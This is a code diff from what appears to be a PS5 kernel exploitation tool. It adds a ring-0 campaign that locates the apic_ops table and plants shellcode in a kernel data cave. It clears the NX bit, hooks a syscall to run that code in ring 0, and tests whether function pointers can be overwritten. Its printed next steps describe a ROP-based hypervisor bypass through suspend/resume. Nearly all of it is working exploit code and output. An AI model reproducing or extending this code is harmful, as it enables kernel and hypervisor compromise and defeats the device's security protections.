+            #define APIC_SCAN_CHUNK  0x1000    /* 4KB at a time */
+            #define APIC_MIN_RUN     4         /* Minimum consecutive ptrs */
+
+            printf("    kdata scan: 0x%lx — 0x%lx (%dMB)\n",
+                   (unsigned long)g_kdata_base,
+                   (unsigned long)(g_kdata_base + APIC_SCAN_SIZE),
+                   APIC_SCAN_SIZE >> 20);
+            fflush(stdout);
+
+            int apic_found_tables = 0;
+            int apic_run_len = 0;
+            uint64_t apic_run_start = 0;
+            uint64_t apic_best_addr = 0;
+            int apic_best_len = 0;
+
+            /*
+             * Track best apic_ops candidate using a composite score.
+             * Real apic_ops has:
+             *   - ~28 entries (Sony trimmed 3 from FreeBSD's 31)
+             *   - Functions from a single .c file (local_apic.c),
+             *     so all pointers cluster within ~8-32KB
+             *   - Mostly unique pointers (each APIC op is distinct)
+             *
+             * Trampoline/stub tables: span < 1KB (32-byte spacing)
+             * VOP tables: span > 1MB (wrappers + real funcs mixed)
+             */
+            uint64_t apic_ops_addr = 0;
+            int apic_ops_len = 0;
+            int apic_ops_score = 0;  /* composite score */
+
+            /* ── Direct check at known FW 4.03 offset first ── */
+            {
+                uint64_t known_kva = g_kdata_base + APIC_OPS_KNOWN_OFFSET;
+                uint64_t known_pa = va_to_pa_quiet(known_kva);
+                printf("\n[*] Direct check at known offset kdata+0x%x...\n",
+                       APIC_OPS_KNOWN_OFFSET);
+                if (known_pa && known_pa < MAX_SAFE_PA) {
+                    uint64_t known_ptrs[40];
+                    kernel_copyout(g_dmap_base + known_pa, known_ptrs,
+                                   sizeof(known_ptrs));
+                    int known_run = 0;
+                    for (int ki = 0; ki < 40; ki++) {
+                        if (known_ptrs[ki] >= g_ktext_base &&
+                            known_ptrs[ki] < g_ktext_base + ktext_size &&
+                            (known_ptrs[ki] & 0x3) == 0) {
+                            known_run++;
+                        } else {
+                            break;
+                        }
+                    }
+                    printf("    Found %d consecutive ktext ptrs at known offset\n",
+                           known_run);
+                    if (known_run >= 20) {
+                        printf("[+] CONFIRMED: apic_ops at kdata+0x%x (%d entries)\n",
+                               APIC_OPS_KNOWN_OFFSET, known_run);
+                        apic_best_addr = known_kva;
+                        apic_best_len = known_run;
+                        apic_found_tables++;
+                        /* Dump all entries */
+                        printf("[*] apic_ops entries:\n");
+                        for (int ki = 0; ki < known_run && ki < 40; ki++) {
+                            printf("    [%2d] 0x%016lx  (ktext+0x%lx)\n",
+                                   ki, (unsigned long)known_ptrs[ki],
+                                   (unsigned long)(known_ptrs[ki] - g_ktext_base));
+                        }
+                        printf("    xapic_mode [2] = 0x%016lx\n",
+                               (unsigned long)known_ptrs[2]);
+                    } else {
+                        printf("    Only %d ptrs — offset may differ on this boot\n",
+                               known_run);
+                    }
+                } else {
+                    printf("    Page not mapped at known offset\n");
+                }
+                printf("\n");
+                fflush(stdout);
+            }
+
+            /*
+             * Full scan: Read kdata in 4KB chunks via kernel_copyout.
+             * For each 8-byte-aligned qword, check if it's in ktext range.
+             * Track runs of consecutive ktext pointers.
+             * apic_ops has 28 entries on PS5 FW 4.03 (Sony trimmed 3
+             * from FreeBSD's 31).
+             */
+            printf("[*] Full scan for other vtables...\n");
+
+            uint8_t apic_chunk[APIC_SCAN_CHUNK];
+
+            for (uint64_t off = 0; off < APIC_SCAN_SIZE;
+                 off += APIC_SCAN_CHUNK) {
+                if ((off & 0xFFFFF) == 0 && off > 0) {
+                    printf("    ...scanning kdata+0x%lx (%luMB/%dMB)\r",
+                           (unsigned long)off, (unsigned long)(off >> 20),
+                           APIC_SCAN_SIZE >> 20);
+                    fflush(stdout);
+                }
+                uint64_t scan_kva = g_kdata_base + off;
+                uint64_t scan_pa = va_to_pa_quiet(scan_kva);
+                if (scan_pa == 0 || scan_pa >= MAX_SAFE_PA) {
+                    /* Page not mapped — reset run */
+                    if (apic_run_len >= APIC_MIN_RUN) {
+                        printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
+                               (unsigned long)(apic_run_start - g_kdata_base),
+                               apic_run_len);
+                        if (apic_run_len > apic_best_len) {
+                            apic_best_len = apic_run_len;
+                            apic_best_addr = apic_run_start;
+                        }
+                        apic_found_tables++;
+                        /* Dump entries for apic_ops-sized tables */
+                        if (apic_run_len >= 20 && apic_run_len <= 35) {
+                            uint64_t tbl_pa2 = va_to_pa_quiet(apic_run_start);
+                            if (tbl_pa2 && tbl_pa2 < MAX_SAFE_PA) {
+                                uint64_t tbl_buf[40];
+                                int cnt = apic_run_len;
+                                if (cnt > 40) cnt = 40;
+                                kernel_copyout(g_dmap_base + tbl_pa2,
+                                               tbl_buf, cnt * 8);
+                                int uniq = 0;
+                                uint64_t pmin = tbl_buf[0], pmax = tbl_buf[0];
+                                for (int u = 0; u < cnt; u++) {
+                                    if (tbl_buf[u] < pmin) pmin = tbl_buf[u];
+                                    if (tbl_buf[u] > pmax) pmax = tbl_buf[u];
+                                    int dup = 0;
+                                    for (int v = 0; v < u; v++) {
+                                        if (tbl_buf[v] == tbl_buf[u]) {
+                                            dup = 1; break;
+                                        }
+                                    }
+                                    if (!dup) uniq++;
+                                }
+                                uint64_t spread = pmax - pmin;
+                                printf("      -> %d/%d unique, spread=0x%lx (%luKB)",
+                                       uniq, cnt,
+                                       (unsigned long)spread,
+                                       (unsigned long)(spread >> 10));
+                                int score = 0;
+                                if (cnt >= 26 && cnt <= 30) {
+                                    score += 10;
+                                    if (cnt == 28) score += 5;
+                                    if (spread >= 0x400 && spread <= 0x10000)
+                                        score += 20;
+                                    else if (spread < 0x400)
+                                        score -= 10;
+                                    else
+                                        score -= 5;
+                                    score += uniq;
+                                }
+                                if (score > apic_ops_score) {
+                                    apic_ops_addr = apic_run_start;
+                                    apic_ops_len = cnt;
+                                    apic_ops_score = score;
+                                    printf(" [BEST apic_ops candidate]");
+                                }
+                                printf("\n");
+                                for (int di = 0; di < cnt; di++) {
+                                    printf("      [%2d] 0x%016lx  (ktext+0x%lx)\n",
+                                           di, (unsigned long)tbl_buf[di],
+                                           (unsigned long)(tbl_buf[di] - g_ktext_base));
+                                }
+                            }
+                        }
+                    }
+                    apic_run_len = 0;
+                    continue;
+                }
+
+                kernel_copyout(g_dmap_base + scan_pa, apic_chunk,
+                               APIC_SCAN_CHUNK);
+
+                for (int qi = 0; qi < APIC_SCAN_CHUNK; qi += 8) {
+                    uint64_t qval;
+                    memcpy(&qval, &apic_chunk[qi], 8);
+
+                    int is_ktext_ptr =
+                        (qval >= g_ktext_base &&
+                         qval < g_ktext_base + ktext_size &&
+                         (qval & 0x3) == 0);  /* 4-byte aligned */
+
+                    if (is_ktext_ptr) {
+                        if (apic_run_len == 0)
+                            apic_run_start = scan_kva + qi;
+                        apic_run_len++;
+                    } else {
+                        if (apic_run_len >= APIC_MIN_RUN) {
+                            printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
+                                   (unsigned long)(apic_run_start - g_kdata_base),
+                                   apic_run_len);
+                            if (apic_run_len > apic_best_len) {
+                                apic_best_len = apic_run_len;
+                                apic_best_addr = apic_run_start;
+                            }
+                            apic_found_tables++;
+
+                            /* Dump entries for apic_ops-sized tables (20-35) */
+                            if (apic_run_len >= 20 && apic_run_len <= 35) {
+                                uint64_t tbl_pa = va_to_pa_quiet(apic_run_start);
+                                if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
+                                    uint64_t tbl_buf[40];
+                                    int cnt = apic_run_len;
+                                    if (cnt > 40) cnt = 40;
+                                    kernel_copyout(g_dmap_base + tbl_pa,
+                                                   tbl_buf, cnt * 8);
+                                    /* Count unique pointers and compute spread */
+                                    int uniq = 0;
+                                    uint64_t pmin = tbl_buf[0], pmax = tbl_buf[0];
+                                    for (int u = 0; u < cnt; u++) {
+                                        if (tbl_buf[u] < pmin) pmin = tbl_buf[u];
+                                        if (tbl_buf[u] > pmax) pmax = tbl_buf[u];
+                                        int dup = 0;
+                                        for (int v = 0; v < u; v++) {
+                                            if (tbl_buf[v] == tbl_buf[u]) {
+                                                dup = 1; break;
+                                            }
+                                        }
+                                        if (!dup) uniq++;
+                                    }
+                                    uint64_t spread = pmax - pmin;
+                                    printf("      -> %d/%d unique, spread=0x%lx (%luKB)",
+                                           uniq, cnt,
+                                           (unsigned long)spread,
+                                           (unsigned long)(spread >> 10));
+                                    /*
+                                     * Score: prefer 28 entries, 1KB-64KB spread,
+                                     * high uniqueness.
+                                     * apic_ops: ~28 entries, ~7KB spread, ~27 unique
+                                     * Trampolines: ~32B spacing → span < 1KB
+                                     * VOP tables: span > 1MB (wrapper + func mix)
+                                     */
+                                    int score = 0;
+                                    if (cnt >= 26 && cnt <= 30) {
+                                        score += 10;           /* right size range */
+                                        if (cnt == 28) score += 5;  /* exact match */
+                                        if (spread >= 0x400 && spread <= 0x10000)
+                                            score += 20;  /* 1KB-64KB = single module */
+                                        else if (spread < 0x400)
+                                            score -= 10; /* too tight = stubs */
+                                        else
+                                            score -= 5;  /* too wide = VOP */
+                                        score += uniq;  /* uniqueness bonus */
+                                    }
+                                    if (score > apic_ops_score) {
+                                        apic_ops_addr = apic_run_start;
+                                        apic_ops_len = cnt;
+                                        apic_ops_score = score;
+                                        printf(" [BEST apic_ops candidate]");
+                                    }
+                                    printf("\n");
+                                    for (int di = 0; di < cnt; di++) {
+                                        printf("      [%2d] 0x%016lx  (ktext+0x%lx)\n",
+                                               di, (unsigned long)tbl_buf[di],
+                                               (unsigned long)(tbl_buf[di] - g_ktext_base));
+                                    }
+                                }
+                            }
+                        }
+                        apic_run_len = 0;
+                    }
+                }
+            }
+            /* Flush final run */
+            if (apic_run_len >= APIC_MIN_RUN) {
+                printf("    [TABLE] kdata+0x%lx: %d ktext ptrs\n",
+                       (unsigned long)(apic_run_start - g_kdata_base),
+                       apic_run_len);
+                if (apic_run_len > apic_best_len) {
+                    apic_best_len = apic_run_len;
+                    apic_best_addr = apic_run_start;
+                }
+                apic_found_tables++;
+                /* Dump entries for apic_ops-sized tables */
+                if (apic_run_len >= 20 && apic_run_len <= 35) {
+                    uint64_t tbl_pa = va_to_pa_quiet(apic_run_start);
+                    if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
+                        uint64_t tbl_buf[40];
+                        int cnt = apic_run_len;
+                        if (cnt > 40) cnt = 40;
+                        kernel_copyout(g_dmap_base + tbl_pa,
+                                       tbl_buf, cnt * 8);
+                        int uniq = 0;
+                        uint64_t pmin = tbl_buf[0], pmax = tbl_buf[0];
+                        for (int u = 0; u < cnt; u++) {
+                            if (tbl_buf[u] < pmin) pmin = tbl_buf[u];
+                            if (tbl_buf[u] > pmax) pmax = tbl_buf[u];
+                            int dup = 0;
+                            for (int v = 0; v < u; v++) {
+                                if (tbl_buf[v] == tbl_buf[u]) {
+                                    dup = 1; break;
+                                }
+                            }
+                            if (!dup) uniq++;
+                        }
+                        uint64_t spread = pmax - pmin;
+                        printf("      -> %d/%d unique, spread=0x%lx (%luKB)",
+                               uniq, cnt,
+                               (unsigned long)spread,
+                               (unsigned long)(spread >> 10));
+                        int score = 0;
+                        if (cnt >= 26 && cnt <= 30) {
+                            score += 10;
+                            if (cnt == 28) score += 5;
+                            if (spread >= 0x400 && spread <= 0x10000)
+                                score += 20;
+                            else if (spread < 0x400)
+                                score -= 10;
+                            else
+                                score -= 5;
+                            score += uniq;
+                        }
+                        if (score > apic_ops_score) {
+                            apic_ops_addr = apic_run_start;
+                            apic_ops_len = cnt;
+                            apic_ops_score = score;
+                            printf(" [BEST apic_ops candidate]");
+                        }
+                        printf("\n");
+                        for (int di = 0; di < cnt; di++) {
+                            printf("      [%2d] 0x%016lx  (ktext+0x%lx)\n",
+                                   di, (unsigned long)tbl_buf[di],
+                                   (unsigned long)(tbl_buf[di] - g_ktext_base));
+                        }
+                    }
+                }
+            }
+
+            printf("\n[*] Found %d function pointer tables.\n",
+                   apic_found_tables);
+
+            if (apic_best_addr) {
+                printf("[+] Largest table: kdata+0x%lx (%d entries)\n",
+                       (unsigned long)(apic_best_addr - g_kdata_base),
+                       apic_best_len);
+            }
+
+            /* Report best apic_ops candidate */
+            if (apic_ops_addr) {
+                printf("[+] Best apic_ops candidate: kdata+0x%lx (%d entries, score=%d)\n",
+                       (unsigned long)(apic_ops_addr - g_kdata_base),
+                       apic_ops_len, apic_ops_score);
+                printf("    xapic_mode slot [2] at kdata+0x%lx\n",
+                       (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
+                /* Export to global for Phase 7 */
+                g_apic_ops_addr = apic_ops_addr;
+                g_apic_ops_count = apic_ops_len;
+            } else {
+                printf("[!] No apic_ops candidate found (26-30 entries with high uniqueness)\n");
+            }
+
+            printf("\n");
+            fflush(stdout);
+
+            /* ─── Phase 4: VMMCALL analysis (NO direct probe) ─── */
+            /*
+             * DISABLED: Direct VMMCALL probe causes kernel panic.
+             *
+             * The HV intercepts VMMCALL (#VMEXIT) and injects #UD or #GP
+             * back into the guest for unrecognized hypercall numbers.
+             * Without a proper IDT-based fault handler installed first,
+             * any fault in kernel mode → kernel panic.
+             *
+             * Safe VMMCALL probing requires:
+             *   1. Install custom #UD/#GP handlers in IDT (vectors 6, 13)
+             *   2. Set up a recovery trampoline (longjmp-style)
+             *   3. Only then issue VMMCALL
+             *   4. If fault fires, handler recovers; if not, VMMCALL survived
+             *
+             * Alternative: Use the apic_ops suspend/resume path (flatz method)
+             * which executes VMMCALL during a window where the HV is inactive.
+             */
+            printf("=============================================\n");
+            printf("  Ring-0 Phase 4: VMMCALL Analysis\n");
+            printf("=============================================\n\n");
+            printf("[*] EFER.SVME=1 confirmed — system runs under AMD SVM HV.\n");
+            printf("[!] Direct VMMCALL probe SKIPPED (causes kernel panic).\n");
+            printf("    HV injects #UD/#GP for unknown hypercalls.\n");
+            printf("    Need IDT fault handler before safe probing.\n\n");
+            printf("[*] Safe VMMCALL strategy (TODO):\n");
+            printf("    1. Hook IDT vector 6 (#UD) and 13 (#GP)\n");
+            printf("    2. Install recovery trampoline in handlers\n");
+            printf("    3. Issue VMMCALL with RAX=0..31\n");
+            printf("    4. If handler fires → HV rejected; if returns → survived\n\n");
+            printf("[*] Alternative: apic_ops suspend/resume path (flatz method)\n");
+            printf("    Overwrite apic_ops.xapic_mode (kdata+offset+0x10)\n");
+            printf("    with ROP gadget, trigger suspend/resume cycle.\n");
+            printf("    Code runs before HV restarts → bypass intercepts.\n");
+            if (apic_ops_addr) {
+                printf("[+] apic_ops candidate at kdata+0x%lx (%d entries, score=%d)\n",
+                       (unsigned long)(apic_ops_addr - g_kdata_base),
+                       apic_ops_len, apic_ops_score);
+                printf("    xapic_mode [2] at 0x%lx (kdata+0x%lx)\n",
+                       (unsigned long)(apic_ops_addr + 0x10),
+                       (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
+            } else if (apic_best_addr) {
+                printf("[?] No 26-30 entry match; largest table at kdata+0x%lx (%d entries)\n",
+                       (unsigned long)(apic_best_addr - g_kdata_base),
+                       apic_best_len);
+            }
+            printf("\n");
+            fflush(stdout);
+
+            /* ─── Phase 5: apic_ops CFI Writeback Test ─── */
+            if (apic_ops_addr) {
+                printf("=============================================\n");
+                printf("  Ring-0 Phase 5: apic_ops Writeback Test\n");
+                printf("=============================================\n\n");
+                printf("[*] Testing if apic_ops function pointers are writable.\n");
+                printf("    apic_ops base: 0x%lx (kdata+0x%lx)\n",
+                       (unsigned long)apic_ops_addr,
+                       (unsigned long)(apic_ops_addr - g_kdata_base));
+                printf("    xapic_mode [2]: 0x%lx (kdata+0x%lx)\n",
+                       (unsigned long)(apic_ops_addr + 0x10),
+                       (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
+                fflush(stdout);
+
+                /*
+                 * Compute DMAP addresses for apic_ops slots.
+                 * Must use DMAP for ring-0 access — direct kdata VA
+                 * causes kernel panic (HV/NPT blocks writes via kdata VA).
+                 */
+                uint64_t apic_pa = va_to_pa_quiet(apic_ops_addr);
+                uint64_t slot0_dmap = g_dmap_base + apic_pa;
+                uint64_t slot2_dmap = g_dmap_base + apic_pa + 0x10;
+                printf("    apic_ops PA: 0x%lx\n", (unsigned long)apic_pa);
+                printf("    slot0 DMAP:  0x%lx\n", (unsigned long)slot0_dmap);
+                printf("    slot2 DMAP:  0x%lx\n", (unsigned long)slot2_dmap);
+                fflush(stdout);
+
+                if (!apic_pa || apic_pa >= MAX_SAFE_PA) {
+                    printf("[-] Cannot resolve apic_ops PA (0x%lx) — skipping.\n",
+                           (unsigned long)apic_pa);
+                } else {
+
+                /* Verify DMAP read of apic_ops matches scan results */
+                uint64_t dmap_verify;
+                kernel_copyout(slot2_dmap, &dmap_verify, 8);
+                printf("    DMAP verify slot2: 0x%016lx\n",
+                       (unsigned long)dmap_verify);
+                fflush(stdout);
+
+                /* Build writeback test shellcode */
+                uint8_t wb_sc[512];
+                int wb_sc_len = build_ring0_apic_writeback_shellcode(
+                    wb_sc, sizeof(wb_sc), result_kva,
+                    slot0_dmap, slot2_dmap);
+                printf("[*] Writeback test shellcode: %d bytes\n", wb_sc_len);
+
+                if (wb_sc_len <= 0 || wb_sc_len > 480) {
+                    printf("[-] Shellcode too large or failed to build.\n");
+                } else {
+                    /* Clear shared buffer */
+                    uint8_t zero_buf2[256];
+                    memset(zero_buf2, 0, sizeof(zero_buf2));
+                    for (int zb = 0; zb < RING0_RESULT_ALLOC_SIZE; zb += 256)
+                        kernel_copyin(zero_buf2, g_dmap_base + cpu_pa + zb, 256);
+
+                    /* Save and write shellcode to kdata cave */
+                    uint8_t wb_backup[512];
+                    kernel_copyout(g_dmap_base + target_pa, wb_backup, wb_sc_len);
+                    printf("[*] Writing shellcode to kdata code cave...\n");
+                    kernel_copyin(wb_sc, g_dmap_base + target_pa, wb_sc_len);
+
+                    /* Verify write */
+                    uint8_t wb_verify[512];
+                    kernel_copyout(g_dmap_base + target_pa, wb_verify, wb_sc_len);
+                    int wb_match = (memcmp(wb_sc, wb_verify, wb_sc_len) == 0);
+                    printf("    Write verify: %s\n", wb_match ? "OK" : "MISMATCH");
+                    fflush(stdout);
+
+                    if (wb_match) {
+                        /* Clear NX+G in PTE */
+                        printf("[*] Clearing NX+G in PTE...\n");
+                        kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);
+
+                        /* Hook sysent[253] */
+                        printf("[*] Hooking sysent[253] → kdata_base...\n");
+                        kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
+                        kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);
+
+                        /* Execute writeback test in ring 0 */
+                        printf("[*] Calling syscall(253) — apic_ops writeback test in ring 0...\n");
+                        fflush(stdout);
+                        errno = 0;
+                        long wb_ret = syscall(253);
+                        int wb_err = errno;
+                        printf("    syscall(253) returned: %ld, errno=%d\n",
+                               wb_ret, wb_err);
+
+                        /* Restore everything immediately */
+                        printf("[*] Restoring PTE, sysent, code cave...\n");
+                        kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
+                        kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
+                        kernel_copyin(wb_backup, g_dmap_base + target_pa, wb_sc_len);
+                        printf("    All restored.\n\n");
+                        fflush(stdout);
+
+                        /* Parse results */
+                        struct kmod_result_buf wb_results;
+                        memcpy(&wb_results, result_vaddr, sizeof(wb_results));
+
+                        if (wb_results.magic == KMOD_MAGIC &&
+                            wb_results.status == KMOD_STATUS_DONE) {
+                            /* Extract results from buffer offsets */
+                            uint64_t original_val, slot0_val;
+                            uint64_t t1_readback, t2_readback, restore_rb;
+                            uint32_t t1_ok, t2_ok, restore_ok;
+                            memcpy(&original_val, (uint8_t*)result_vaddr + 32, 8);
+                            memcpy(&slot0_val, (uint8_t*)result_vaddr + 40, 8);
+                            memcpy(&t1_readback, (uint8_t*)result_vaddr + 48, 8);
+                            memcpy(&t1_ok, (uint8_t*)result_vaddr + 56, 4);
+                            memcpy(&t2_readback, (uint8_t*)result_vaddr + 64, 8);
+                            memcpy(&t2_ok, (uint8_t*)result_vaddr + 72, 4);
+                            memcpy(&restore_rb, (uint8_t*)result_vaddr + 80, 8);
+                            memcpy(&restore_ok, (uint8_t*)result_vaddr + 88, 4);
+
+                            printf("[+] apic_ops[2] (xapic_mode) = 0x%016lx\n",
+                                   (unsigned long)original_val);
+                            printf("[+] apic_ops[0] (create)     = 0x%016lx\n",
+                                   (unsigned long)slot0_val);
+
+                            printf("\n[*] Test 1: Same-value writeback\n");
+                            printf("    Wrote:    0x%016lx → apic_ops[2]\n",
+                                   (unsigned long)original_val);
+                            printf("    Readback: 0x%016lx\n",
+                                   (unsigned long)t1_readback);
+                            if (t1_ok) {
+                                printf("[+] TEST 1 PASSED — same-value write OK\n");
+                            } else {
+                                printf("[-] TEST 1 FAILED — readback mismatch!\n");
+                                printf("    CFI or HV may be blocking writes.\n");
+                            }
+
+                            printf("\n[*] Test 2: Cross-type write (slot0 → slot2)\n");
+                            printf("    Wrote:    0x%016lx → apic_ops[2]\n",
+                                   (unsigned long)slot0_val);
+                            printf("    Readback: 0x%016lx\n",
+                                   (unsigned long)t2_readback);
+                            if (t2_ok) {
+                                printf("[+] TEST 2 PASSED — cross-type write OK!\n");
+                                printf("    apic_ops[2] can be overwritten with arbitrary ktext ptr.\n");
+                            } else {
+                                printf("[-] TEST 2 FAILED — cross-type write blocked!\n");
+                                printf("    HV or CFI may enforce pointer types.\n");
+                            }
+
+                            printf("\n[*] Restore verification:\n");
+                            printf("    Readback: 0x%016lx\n",
+                                   (unsigned long)restore_rb);
+                            if (restore_ok) {
+                                printf("[+] RESTORE OK — original value confirmed\n");
+                            } else {
+                                printf("[!] RESTORE MISMATCH — apic_ops may be corrupted!\n");
+                            }
+
+                            if (t1_ok && t2_ok && restore_ok) {
+                                printf("\n[+] ============================================\n");
+                                printf("[+]  APIC_OPS WRITABLE — READY FOR FLATZ METHOD\n");
+                                printf("[+] ============================================\n");
+                                printf("[+] apic_ops[2] (xapic_mode) can be overwritten.\n");
+                                printf("[+] Next: overwrite with ROP gadget, trigger suspend/resume.\n");
+                                printf("[+] Target address: 0x%lx\n",
+                                       (unsigned long)(apic_ops_addr + 0x10));
+                            }
+                        } else if (wb_err != 0) {
+                            printf("[-] Writeback test CRASHED (errno=%d)\n", wb_err);
+                            printf("    The HV may trap writes to apic_ops.\n");
+                        } else {
+                            printf("[-] Writeback test did not complete.\n");
+                            printf("    Magic: 0x%lx, Status: %u\n",
+                                   (unsigned long)wb_results.magic,
+                                   wb_results.status);
+                        }
+                    } else {
+                        /* Restore on verify failure */
+                        kernel_copyin(wb_backup, g_dmap_base + target_pa, wb_sc_len);
+                    }
+                }
+                } /* end apic_pa valid check */
+                printf("\n");
+                fflush(stdout);
+            }
+        } else if (buf_check != 0) {
+            printf("[?] Buffer has unexpected value: 0x%lx\n",
+                   (unsigned long)buf_check);
+            printf("    Partial execution or different code path.\n");
+        } else {
+            printf("[-] Buffer still zero — shellcode did not execute.\n");
+            if (r0_err != 0) {
+                printf("    errno=%d suggests a fault occurred.\n", r0_err);
+                printf("    Likely: stale TLB entry with NX=1.\n");
+                printf("    Need: invlpg or CR4.PGE toggle to flush.\n");
+            } else {
+                printf("    But no error either — investigate.\n");
+            }
+        }
+        printf("\n");
+        fflush(stdout);
+    }
+
+r0_skip: ;
+}
+
 static void campaign_kmod_kldload(void) {
     printf("\n=============================================\n");
     printf("  Campaign 7: Kernel Module (kldload)\n");
@@ -6762,6 +8848,8 @@ int main(void) {
      * load module code/data.  Loading the kmod destabilizes the system
      * (freeze/crash shortly after).  Phase 9 now builds the #GP handler
      * inline — no kmod dependency.  */
+    campaign_ring0_execution();
+
     /* campaign_kmod_kldload(); */
 
     /* Phase 6: Flatz suspend/resume setup (XOTEXT clear + gadget scan) */
